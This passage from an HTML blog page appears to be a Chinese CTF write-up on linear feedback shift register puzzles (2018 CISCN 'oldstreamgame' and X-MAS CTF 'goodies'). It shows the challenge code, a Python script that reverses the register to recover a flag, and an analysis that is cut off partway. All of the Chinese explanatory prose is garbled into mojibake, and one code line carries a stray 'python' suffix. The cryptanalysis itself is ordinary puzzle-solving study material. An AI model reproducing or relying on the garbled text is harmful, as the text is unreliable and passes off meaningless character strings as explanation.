class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;1110101100001101011&#125;</span><br></pre></td></tr></table></figure><h3 id="2018-å›½èµ›-oldstreamgame"><a href="#2018-å›½èµ›-oldstreamgame" class="headerlink" title="2018 å›½èµ› oldstreamgame"></a>2018 å›½èµ› oldstreamgame</h3><p>çœ‹ä¸€ä¸‹é¢˜ç›®ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">flag = <span class="string">&quot;flag&#123;xxxxxxxxxxxxxxxx&#125;&quot;</span></span><br><span class="line"><span class="keyword">assert</span> flag.startswith(<span class="string">&quot;flag&#123;&quot;</span>)</span><br><span class="line"><span class="keyword">assert</span> flag.endswith(<span class="string">&quot;&#125;&quot;</span>)</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(flag)==<span class="number">14</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lfsr</span>(<span class="params">R,mask</span>):</span></span><br><span class="line">    output = (R &lt;&lt; <span class="number">1</span>) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    i=(R&amp;mask)&amp;<span class="number">0xffffffff</span></span><br><span class="line">    lastbit=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i!=<span class="number">0</span>:</span><br><span class="line">        lastbit^=(i&amp;<span class="number">1</span>)</span><br><span class="line">        i=i&gt;&gt;<span class="number">1</span></span><br><span class="line">    output^=lastbit</span><br><span class="line">    <span class="keyword">return</span> (output,lastbit)</span><br><span class="line"></span><br><span class="line">R=<span class="built_in">int</span>(flag[<span class="number">5</span>:<span class="number">-1</span>],<span class="number">16</span>)</span><br><span class="line">mask = <span class="number">0b10100100000010000000100010010100</span></span><br><span class="line"></span><br><span class="line">f=<span class="built_in">open</span>(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;w&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    tmp=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        (R,out)=lfsr(R,mask)</span><br><span class="line">        tmp=(tmp &lt;&lt; <span class="number">1</span>)^out</span><br><span class="line">    f.write(<span class="built_in">chr</span>(tmp))</span><br><span class="line">f.close()python</span><br></pre></td></tr></table></figure><p>åŒæ ·æ˜¯ä¸€ä¸ª LFSRï¼Œä¸ä¹‹å‰ä¸åŒçš„æ˜¯ flag æ˜¯ 8 ä½åå…­è¿›åˆ¶ï¼Œä¹Ÿå°±æ˜¯ LFSR åˆå§‹çŠ¶æ€æ˜¯ 32 bitï¼Œè¿™é‡Œæˆ‘ä»¬ä¹Ÿå¯ä»¥é‡‡ç”¨æš´åŠ›æšä¸¾çš„æ–¹å¼ï¼Œä½†æ˜¯æ›´å¥½çš„æ–¹å¼æ˜¯åˆ†æä¸€ä¸‹åŸç†ã€‚</p><h4 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h4><p>æˆ‘ä»¬ä»”ç»†åˆ†æä¸€ä¸‹ <code>lfsr</code> è¿™ä¸ªå‡½æ•°çš„ä½œç”¨ï¼š</p><p>å‡½æ•°ä¼ å…¥ R å’Œ mask ä¸¤ä¸ªå‚æ•°ï¼Œoutput ç”± R å·¦ç§»ä¸€ä½ç„¶åå’Œ 0xffffffff è¿›è¡Œäº†ä¸æ“ä½œå¾—åˆ°ï¼Œç›¸å½“äºæŠŠåŸæ¥ R çš„æœ€é«˜æ¯”ç‰¹ä½é¡¶æ‰äº†ï¼Œæœ«å°¾å¡«äº†ä¸€ä¸ª 0 ã€‚i æ˜¯ç”± R å’Œ mask è¿›è¡Œäº†ä¸æ“ä½œï¼Œåé¢çš„å¾ªç¯ä¸»è¦ç”¨äºå¾—åˆ° lastbitã€‚</p><p>lastbit é¦–å…ˆä¸º 0ï¼Œ ç„¶å lastbit å’Œ i &amp;1 çš„ç»“æœå¼‚æˆ–ï¼Œi å³ç§»ä¸€ä½ï¼Œä»¥æ­¤ç±»æ¨ï¼ŒçŸ¥é“ i ä¸º 0ï¼Œä¸éš¾åˆ†æå‡º lastbit å®é™…å°±æ˜¯ i çš„æ¯ä¸ªæ¯”ç‰¹ä½å¼‚æˆ–å¾—åˆ°çš„ã€‚åœ¨å¾ªç¯ç»“æŸå output å’Œ lastbit è¿›è¡Œäº†å¼‚æˆ–ï¼Œç”±äºä¹‹å‰ output çš„æœ€ä½æ¯”ç‰¹æ˜¯ 0ï¼Œæ‰€ä»¥ç›¸å½“äºæŠŠ output çš„æœ€ä½ä½è®¾æˆäº† lastbitã€‚å‡½æ•°è¿”å› output å’Œ lastbit è¿”å›ã€‚</p><p>æ€»ç»“ä¸€ä¸‹ lfsr è¿™ä¸ªå‡½æ•°ï¼š</p><p><strong>å¯¹äºä¼ å…¥çš„ R å’Œ maskï¼ŒR å·¦ç§»ä¸€ä½æŠŠæœ€é«˜ä½é¡¶æ‰ï¼Œæœ€ä½ä¸€ä½ç”± R &amp; mask ç»“æœçš„å„ä¸ªæ¯”ç‰¹ä½å¼‚æˆ–çš„ç»“æœè¿›è¡Œå¡«å……ã€‚å¹¶è¿”å›æœ€ç»ˆç»“æœå’Œæœ€ä½ä½ã€‚</strong></p><p>å¯ä»¥çœ‹åˆ°è¿™å°±æ˜¯ä¸€ä¸ªå…¸å‹çš„çº¿æ€§åé¦ˆç§»ä½å¯„å­˜å™¨çš„å®ç°ï¼Œåˆå§‹çŠ¶æ€æ˜¯ flag çš„ 32 æ¯”ç‰¹ä½ï¼Œéšåä¸æ–­é¡¶æ‰é«˜ä½ï¼Œåœ¨æœ€åä¸€ä½å¡«å……ã€‚å¯ä»¥æƒ³è±¡æˆä¸€ä¸ªé•¿åº¦ä¸º 32 çš„é˜Ÿåˆ—ï¼Œæ¯ä¸€æ¬¡é˜Ÿåˆ—å‘å‰ç§»åŠ¨ï¼Œæœ€å‰é¢ï¼ˆæœ€é«˜ä½ï¼‰çš„å‡ºå»ï¼Œåé¢å¡«å……çš„ç”±å‰ä¸€çŠ¶æ€çš„ 32 ä¸ªæ¯”ç‰¹ç»è¿‡è¿ç®—å†³å®šï¼ˆå…·ä½“å°±æ˜¯ lastbit çš„ç”Ÿæˆæ–¹æ³•ï¼‰ã€‚</p><p>æˆ‘ä»¬çœ‹ä¸€ä¸‹ lastbit çš„ç”Ÿæˆæ–¹æ³•ï¼ŒR å’Œ mask è¿›è¡Œä¸æ“ä½œï¼Œmask æ˜¯ <code>0b10100100000010000000100010010100</code>,å’Œ 0 è¿›è¡Œä¸æ“ä½œè‚¯å®šæ˜¯ 0ï¼Œæ‰€ä»¥å®é™…ä¸Š R åªæœ‰å‡ ä¸ªæ¯”ç‰¹ä½èµ·ä½œç”¨ï¼Œå°±æ˜¯ mask ä¸º 1 çš„é‚£äº› bit ä½ã€‚ä¹Ÿå°±æ˜¯è¯´ R çš„è¿™äº›ä½å¼‚æˆ–å¾—åˆ°äº† lastbitã€‚</p><p>è¿™ä¸ª LFSR å½“ç”Ÿæˆäº†ç¬¬ä¸€ä¸ªæ¯”ç‰¹æ—¶ï¼Œflag æœ€åˆå§‹çš„ 32 æ¯”ç‰¹æœ€é«˜æ¯”ç‰¹è¢«é¡¶å‡ºå»äº†ï¼Œç”Ÿæˆç¬¬äºŒä¸ªæ¯”ç‰¹æ—¶ï¼ŒåŸå§‹çŠ¶æ€çš„ç¬¬äºŒé«˜ä½è¢«é¡¶å‡ºå»äº†ã€‚æˆ‘ä»¬ä¸å¦¨æƒ³ä¸€ä¸‹å½“ç”Ÿæˆç¬¬ 32 ä¸ªæ¯”ç‰¹ç»“æŸåï¼Œæ­¤æ—¶çš„çŠ¶æ€å°±æ˜¯ flag æœ€åˆå§‹çš„ 32 æ¯”ç‰¹å®Œå…¨éƒ½è¢«é¡¶å‡ºå»äº†ã€‚è€Œè¿™ 32 ä¸ªæ¯”ç‰¹æˆ‘ä»¬éƒ½å·²çŸ¥ï¼ˆç¨‹åºæ¯æ¬¡éƒ½æŠŠ lastbit è®°å½•å†™è¿›äº† key ä¸­ï¼‰ã€‚æ­¤æ—¶çŠ¶æ€çš„ 32 ä¸ªæ¯”ç‰¹çš„æœ€ä½ä½æ˜¯ç”±ä¸Šä¸€çŠ¶æ€çš„ 32 æ¯”ç‰¹èµ·ä½œç”¨çš„é‚£äº›ä½å¼‚æˆ–å¾—åˆ°çš„ï¼Œè€Œ mask çš„æœ€é«˜ä½æ˜¯ 1ï¼Œæ‰€ä»¥ä¹Ÿå°±æ˜¯ä¸Šä¸€ä¸ªçŠ¶æ€çš„æœ€é«˜ä½å‚ä¸äº†å¼‚æˆ–è¿ç®—ï¼Œè€Œä¸Šä¸€ä¸ªçŠ¶æ€æœ€é«˜ä½å°±æ˜¯è¢«é¡¶å‡ºå»çš„ flag åˆå§‹çŠ¶æ€çš„æœ€ä½ä¸€ä½ï¼Œæ­¤å¤–æˆ‘ä»¬å¯ä»¥å¾—åˆ°å‚ä¸å¼‚æˆ–è¿ç®—çš„å…¶ä»–æ¯”ç‰¹ä½ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ç®—å‡ºåˆå§‹çŠ¶æ€çš„æœ€ä½ä½äº†ã€‚</p><p>ç”¨å¼å­æ¥è¯´æ˜ï¼ŒæŠŠå¼€å§‹ç”Ÿæˆç¬¬ 32 æ¯”ç‰¹çš„çŠ¶æ€æ¯”ä½œ xï¼Œx[i] ä»£è¡¨ä»é«˜åˆ°ä½çš„ç¬¬å‡ ä½ï¼Œé‚£ä¹ˆï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lastbit &#x3D; x[1] ^ x[3] ^ x[6] ^ x[13] ^ x[21] ^ x[25] ^ x[28] ^ x[30]</span><br></pre></td></tr></table></figure><p>lastbit ä»£è¡¨ç”Ÿæˆçš„ç¬¬ 32 ä¸ªæ¯”ç‰¹ï¼Œx[1] ä»£è¡¨<strong>åˆå§‹çŠ¶æ€çš„æœ€ä½æ¯”ç‰¹ä½</strong>ï¼Œè¿™ä¸ªå¼å­ä¸­åªæœ‰ x[1] æœªçŸ¥ï¼Œæˆ‘ä»¬å¯ä»¥è®¡ç®—å‡º x[1],è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡ç”Ÿæˆç¬¬ 32 ä¸ªæ¯”ç‰¹åçš„çŠ¶æ€è¿˜åŸäº†ç”Ÿæˆç¬¬ 31 ä¸ªæ¯”ç‰¹åï¼ˆç”Ÿæˆç¬¬ 32 ä¸ªæ¯”ç‰¹å‰ï¼‰çš„çŠ¶æ€ï¼Œä»¥æ­¤ç±»æ¨ï¼Œç»è¿‡ 32 æ¬¡æˆ‘ä»¬å¯ä»¥å®Œå…¨è¿˜åŸåˆ°åˆå§‹çŠ¶æ€ã€‚</p><p>åŸç†ç®€å•æ¥è¯´å°±æ˜¯æ–°ç”Ÿæˆçš„æ¯”ç‰¹æ˜¯é€šè¿‡ä¸Šä¸€ä¸ªçŠ¶æ€çš„ç‰¹å®šæ¯”ç‰¹å¼‚æˆ–å¾—åˆ°ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨å¼‚æˆ–æ€§è´¨ç”¨ç”Ÿæˆçš„æ¯”ç‰¹å»è¿˜åŸåŸæ¥çš„æ¯”ç‰¹ã€‚</p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><p>æ ¹æ®æ€è·¯å†™å‡ºè§£é¢˜è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">LFSR_inv</span>(<span class="params">R,mask</span>):</span></span><br><span class="line">    <span class="built_in">str</span>=<span class="built_in">bin</span>(R)[<span class="number">2</span>:].zfill(<span class="number">32</span>)</span><br><span class="line">    new=<span class="built_in">str</span>[<span class="number">-1</span>:]+<span class="built_in">str</span>[:<span class="number">-1</span>]</span><br><span class="line">    new=<span class="built_in">int</span>(new,<span class="number">2</span>)                    <span class="comment">#Rå¾ªç¯å³ç§»ä¸€ä½å¾—åˆ°new</span></span><br><span class="line">    i = (new &amp; mask) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    lastbit = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i != <span class="number">0</span>:</span><br><span class="line">        lastbit ^= (i &amp; <span class="number">1</span>)</span><br><span class="line">        i = i &gt;&gt; <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> R&gt;&gt;<span class="number">1</span> | lastbit&lt;&lt;<span class="number">31</span>         <span class="comment">#æœ€é«˜ä½ç”¨lastbitå¡«å……</span></span><br><span class="line"></span><br><span class="line">mask = <span class="number">0b10100100000010000000100010010100</span></span><br><span class="line">data=<span class="built_in">open</span>(<span class="string">&#x27;key&#x27;</span>).read()</span><br><span class="line">data=data[:<span class="number">4</span>]</span><br><span class="line">c=libnum.s2n(data)                    <span class="comment">#ç”Ÿæˆ32æ¯”ç‰¹åçš„çŠ¶æ€</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    c=LFSR_inv(c,mask)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(c)</span><br></pre></td></tr></table></figure><p>è¿è¡Œå¾—åˆ°ç»“æœï¼š0x926201d7L</p><p>æ‰€ä»¥ flag æ˜¯</p><blockquote><p>flag{926201d7}</p></blockquote><h3 id="2018-X-MAS-CTF-goodies"><a href="#2018-X-MAS-CTF-goodies" class="headerlink" title="2018 X-MAS CTF goodies"></a>2018 X-MAS CTF goodies</h3><p>è¿™ä¸ªé¢˜ç®—æ˜¯ä¸€ä¸ª LFSR çš„å˜å½¢ï¼Œæ„Ÿè§‰è€ƒçš„å¾ˆæœ‰è¶£ã€‚çœ‹ä¸‹é¢˜ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>).read().strip()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PRNG</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.seed = self.getseed()</span><br><span class="line">        self.iv = <span class="built_in">int</span>(<span class="built_in">bin</span>(self.seed)[<span class="number">2</span>:].zfill(<span class="number">64</span>)[<span class="number">0</span>:<span class="number">32</span>], <span class="number">2</span>)</span><br><span class="line">        self.key = <span class="built_in">int</span>(<span class="built_in">bin</span>(self.seed)[<span class="number">2</span>:].zfill(<span class="number">64</span>)[<span class="number">32</span>:<span class="number">64</span>], <span class="number">2</span>)</span><br><span class="line">        self.mask = <span class="built_in">int</span>(<span class="built_in">bin</span>(self.seed)[<span class="number">2</span>:].zfill(<span class="number">64</span>)[<span class="number">64</span>:<span class="number">96</span>], <span class="number">2</span>)</span><br><span class="line">        self.aux = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parity</span>(<span class="params">self, x</span>):</span></span><br><span class="line">        x ^= x &gt;&gt; <span class="number">16</span></span><br><span class="line">        x ^= x &gt;&gt; <span class="number">8</span></span><br><span class="line">        x ^= x &gt;&gt; <span class="number">4</span></span><br><span class="line">        x ^= x &gt;&gt; <span class="number">2</span></span><br><span class="line">        x ^= x &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> x &amp; <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getseed</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">int</span>(os.urandom(<span class="number">12</span>).encode(<span class="string">&#x27;hex&#x27;</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">LFSR</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self.iv &gt;&gt; <span class="number">1</span> | (self.parity(self.iv &amp; self.key) &lt;&lt; <span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">next</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.aux, self.iv = self.iv, self.LFSR()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">next_byte</span>(<span class="params">self</span>):</span></span><br><span class="line">        x = self.iv ^ self.mask</span><br><span class="line">        self.<span class="built_in">next</span>()</span><br><span class="line">        x ^= x &gt;&gt; <span class="number">16</span></span><br><span class="line">        x ^= x &gt;&gt; <span class="number">8</span></span><br><span class="line">        <span class="keyword">return</span> (x &amp; <span class="number">255</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">s</span>):</span></span><br><span class="line">    o = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> s:</span><br><span class="line">        o += <span class="built_in">chr</span>(<span class="built_in">ord</span>(x) ^ p.next_byte())</span><br><span class="line">    <span class="keyword">return</span> o.encode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = PRNG()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag.enc&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(encrypt(flag))</span><br></pre></td></tr></table></figure><p>flag.enc:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ab38abdef046216128f8ea76ccfcd38a4a8649802e95f817a2fc945dc04a966d502ef1e31d0a2d</span><br></pre></td></tr></table></figure><h4 id="åˆ†æ-1"><a href="#åˆ†æ-1" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h4><p>å¯ä»¥çœ‹åˆ°ç¨‹åºé‡‡ç”¨å¼‚æˆ–æ–¹å¼åŠ å¯†äº† flagï¼Œè€Œæ¯æ¬¡ä¸ flag å¼‚æˆ–çš„å­—èŠ‚ç”±ç±»ä¸­çš„ <code>next_byte</code>æ–¹æ³•ç”Ÿæˆã€‚æˆ‘ä»¬å†çœ‹ä¸€ä¸‹è¿™ä¸ªç±»ï¼Œå‘ç°æ„é€ å‡½æ•°åˆå§‹åŒ–äº†å››ä¸ªå˜é‡ï¼Œå…¶ä¸­ <code>ivã€keyã€mask</code>éƒ½æ˜¯æ ¹æ®éšæœºå­—ç¬¦ä¸²ç”Ÿæˆçš„ 32 ä½æ¯”ç‰¹æµï¼Œæˆ‘ä»¬æ— æ³•å¾—çŸ¥ï¼Œaux è¿™ä¸ªå˜é‡åˆå§‹åŒ–ä¸º 0ã€‚</p><p>æˆ‘ä»¬æ¥ä»å¤´è¿‡ä¸€ä¸‹ <code>next_byte</code>è¿™ä¸ªæ–¹æ³•æ˜¯æ€ä¹ˆç”Ÿæˆä¸€ä¸ªå­—èŠ‚çš„ï¼š</p><p>æŠŠ iv å’Œ mask è¿›è¡Œå¼‚æˆ–å¾—åˆ° xï¼Œè¿›è¡Œ <code>x ^= x &gt;&gt; 16</code> <code>x ^= x &gt;&gt; 8</code> è¿™ä¸¤æ­¥ï¼ŒæŠŠ <code>x &amp; 255</code>ç»“æœè¿”å›ï¼Œè¿™å°±æ˜¯ç”Ÿæˆçš„å­—èŠ‚ã€‚è€Œåœ¨è¿™ä¹‹ä¸­è°ƒç”¨äº† next æ–¹æ³•æ”¹å˜äº†ç±»çš„ ivï¼Œè€Œ mask å§‹ç»ˆä¸å˜ã€‚</p><p>æˆ‘ä»¬ä¸éš¾å‘ç°è¿™å‡ æ­¥æ“ä½œï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">x ^= x &gt;&gt; <span class="number">16</span></span><br><span class="line">x ^= x &gt;&gt; <span class="number">8</span></span><br><span class="line"><span class="keyword">return</span> x &amp; <span class="number">255</span></span><br></pre></td></tr></table></figure><p>å…¶å®å°±æ˜¯æŠŠ x çš„ä½ 32 bit æŒ‰é¡ºåºåˆ†æˆå››ç»„ï¼Œæ¯ç»„ 8 ä¸ªæ¯”ç‰¹ï¼Œå››ç»„æ•°è¿›è¡Œå¼‚æˆ–å°±æ˜¯è¿”å›çš„ç»“æœã€‚ï¼ˆä¸ä¿¡å¯ä»¥æ‹¿ä¸ªæ•°è¯•è¯•ï¼‰</p><p>æˆ‘ä»¬å†æ¥çœ‹ä¸€ä¸‹ iv æ¯æ¬¡æ˜¯å¦‚ä½•æ”¹å˜çš„ï¼Œnext å‡½æ•°å°±ä¸€è¡Œè¯­å¥ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">self.aux, self.iv = self.iv, self.LFSR()</span><br></pre></td></tr></table></figure><p>auxæˆ‘ä»¬ä¸ç®¡ï¼Œå› ä¸ºå®ƒæ²¡æœ‰å‚ä¸ä»»ä½•è¿ç®—ã€‚æ–°çš„ iv è¢« LFSR å‡½æ•°çš„è¿”å›å€¼èµ‹å€¼ï¼Œçœ‹ä¸€ä¸‹ LFSR å‡½æ•°ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> self.iv &gt;&gt; <span class="number">1</span> | (self.parity(self.iv &amp; self.key) &lt;&lt; <span class="number">32</span>)</span><br></pre></td></tr></table></figure><p>è¿”å›äº† iv ä¸ parity å‡½æ•°è¿”å›å€¼å³ç§» 32 ä½ è¿›è¡Œæˆ–è¿ç®—çš„ç»“æœã€‚</p><p>æˆ‘ä»¬å†æ¥çœ‹ä¸€ä¸‹ parity å‡½æ•°ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">x ^= x &gt;&gt; <span class="number">16</span></span><br><span class="line">x ^= x &gt;&gt; <span class="number">8</span></span><br><span class="line">x ^= x &gt;&gt; <span class="number">4</span></span><br><span class="line">x ^= x &gt;&gt; <span class="number">2</span></span><br><span class="line">x ^= x &gt;&gt; <span class="number">1</span></span><br><span class="line"><span class="keyword">return</span> x &amp; <span class="number">1</span></span><br></pre></td></tr></table></figure><p>å’Œå‰é¢ next_byte çš„å·®ä¸å¤šï¼Œä¸éš¾åˆ†æå‡ºè¿™ä¸ª parity å®é™…å°±æ˜¯æŠŠ x çš„ä½ 32 ä¸ªæ¯”ç‰¹ä¹‹é—´è¿›è¡Œå¼‚æˆ–ï¼Œè¿”å›ç»“æœã€‚å½“ç„¶ï¼Œç»“æœåªèƒ½æ˜¯ 0 æˆ–1ã€‚</p><p>å¦‚æœæŠŠ <code>(self.parity(self.iv &amp; self.key) &lt;&lt; 32)</code> çš„ç»“æœæ¯”ä½œ sï¼Œé‚£ä¹ˆ s ä¸¤ç§å¯èƒ½ï¼Œ0 å’Œ 2**32ã€‚</p><p>æ–°çš„ iv æ˜¯ç”±å½“å‰çš„ iv å³ç§»ä¸€ä½å’Œ s è¿›è¡Œä¸æ“ä½œå¾—åˆ°çš„ã€‚æ³¨æ„è¿™é‡Œ iv å¯èƒ½æ˜¯ 32 ä½ï¼Œä¹Ÿå¯èƒ½æ˜¯ 33 ä½ï¼Œå› ä¸º 2**32 æ˜¯ 33 ä½ã€‚</p><p>æŠŠå„ä¸ªå‡½æ•°å’Œ iv ç”Ÿæˆæ–¹æ³•è¿‡äº†ä¸€éï¼Œå‘ç°æˆ‘ä»¬ä»€ä¹ˆä¹Ÿä¸çŸ¥é“ï¼Œå·²çŸ¥åªæœ‰å¯†æ–‡ï¼Œåˆå§‹ iv ï¼Œmaskï¼Œkey éƒ½æ˜¯æœªçŸ¥ã€‚ä½†æ˜¯è¿˜æœ‰ä¸€ä¸ªæ¡ä»¶ï¼Œæˆ‘ä»¬æ˜¯çŸ¥é“ flag æ˜¯ä»¥<code>X-MAS&#123;</code>å¼€å¤´çš„ã€‚è¿™æ ·æˆ‘ä»¬å¯ä»¥å¾—åˆ° next_byte ç”Ÿæˆçš„å‰ 6 ä¸ªå­—èŠ‚ï¼Œä½†æ˜¯æˆ‘ä»¬ä¹Ÿæ— æ³•è¿˜åŸåˆå§‹ iv å’Œ maskï¼Œkeyã€‚æ³¨æ„ï¼Œæˆ‘ä»¬åªéœ€è¦<strong>è¿˜åŸæ˜æ–‡</strong>å°±å¯ä»¥äº†ï¼Œä¸éœ€è¦çŸ¥é“ ivï¼Œmaskä»¥åŠ key ã€‚</p><p>æˆ‘ç”¨ä¸€ä¸ªå›¾æ¥è¯´æ˜ä¸€ä¸‹å­—èŠ‚çš„ç”Ÿæˆï¼š</p><table><thead><tr><th></th><th>i[1]</th><th>i[2]</th><th>i[3]</th><th>i[4]</th><th>i[5]</th><th>i[6]</th><th>i[7]</th><th>i[8]</th></tr></thead><tbody><tr><td>xor</td><td>i[9]</td><td>i[10]</td><td>i[11]</td><td>i[12]</td><td>i[13]</td><td>i[14]</td><td>i[15]</td><td>i[16]</td></tr><tr><td>xor</td><td>i[17]</td><td>i[18]</td><td>i[19]</td><td>i[20]</td><td>i[21]</td><td>i[22]</td><td>i[23]</td><td>i[24]</td></tr><tr><td>xor</td><td>i[25]</td><td>i[26]</td><td>i[27]</td><td>i[28]</td><td>i[29]</td><td>i[30]</td><td>i[31]</td><td>i[32]</td></tr><tr><td>xor</td><td>m[1]</td><td>m[2]</td><td>m[3]</td><td>m[4]</td><td>m[5]</td><td>m[6]</td><td>m[7]</td><td>m[8]</td></tr><tr><td>xor</td><td>m[9]</td><td>m[10]</td><td>m[11]</td><td>m[12]</td><td>m[13]</td><td>m[14]</td><td>m[15]</td><td>m[16]</td></tr><tr><td>xor</td><td>m[17]</td><td>m[18]</td><td>m[19]</td><td>m[20]</td><td>m[21]</td><td>m[22]</td><td>m[23]</td><td>m[24]</td></tr><tr><td>xor</td><td>m[25]</td><td>m[26]</td><td>m[27]</td><td>m[28]</td><td>m[29]</td><td>m[30]</td><td>m[31]</td><td>m[32]</td></tr></tbody></table><p>æŠŠ xor å½“æˆæ­£å¸¸çš„åŠ æ³•ï¼Œä¸€åˆ—çš„è¿›è¡Œå¼‚æˆ–ï¼Œæœ€ç»ˆå¾—åˆ°çš„å…«ä¸ªæ¯”ç‰¹å°±æ˜¯ç”Ÿæˆçš„å­—èŠ‚ã€‚å…¶ä¸­ i[1] ä»£è¡¨ iv <strong>ä½32æ¯”ç‰¹ä¸­</strong>ä»é«˜åˆ°ä½çš„ç¬¬ 1 ä¸ªæ¯”ç‰¹ï¼ˆå› ä¸ºåé¢ iv å¯èƒ½ 33 ä¸ªæ¯”ç‰¹ï¼‰ï¼Œm[5] ä»£è¡¨ mask ä»é«˜åˆ°ä½çš„ç¬¬ 5 